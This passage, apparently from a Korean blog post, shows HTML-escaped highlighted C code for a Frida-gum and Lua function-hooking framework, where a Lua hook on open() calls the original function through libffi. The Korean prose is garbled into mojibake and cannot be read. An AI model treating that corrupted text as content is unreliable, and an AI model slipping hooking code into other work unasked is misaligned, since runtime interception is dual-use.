    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_open(%s, %d) =&amp;gt; %d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lua_pointer_to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//p2string&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_touserdata&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_pushstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lua_pointer_to_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//p2number&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_touserdata&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_pushinteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lua í•¨ìˆ˜ new_openì—ì„œ pathnameê³¼ flagëŠ” ì‚¬ìš©ì ë°ì´í„°ì´ë¯€ë¡œ ì´ë¥¼ ê°€ê³µí•˜ê³  ì¶œë ¥í•˜ë ¤ë©´ Lua í˜•ì‹ìœ¼ë¡œ ë°ì´í„°ë¥¼ ë³€í™˜í•  í•„ìš”ì„±ì´ ìˆìŠµë‹ˆë‹¤. ë³¸ë¬¸ì—ì„œëŠ” p2string, p2numberì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì œê³µí•´ì£¼ëŠ” ë°©ì‹ìœ¼ë¡œ í•´ê²°í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;original_xxx ì›ë³¸ í•¨ìˆ˜ í˜¸ì¶œì— ëŒ€í•œ êµ¬í˜„ì€ ë‹¤ìŒì˜ ë°©ë²•ìœ¼ë¡œ ì§„í–‰í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LpHookChain&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;find_by_original_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;original_function_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_Debug&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_getstack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_getinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;nSl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//printf(&quot;original_function_handler:: %s\n&quot;, ar.name);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;LpHookChain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_by_original_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gpointer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fnpointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gum_module_find_export_by_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_gettop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ffi_cif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ffi_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;values&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LUA_TNUMBER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_isinteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_type_sint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_tointeger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_type_double&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_tonumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LUA_TSTRING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_type_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_tostring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LUA_TLIGHTUSERDATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ffi_type_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
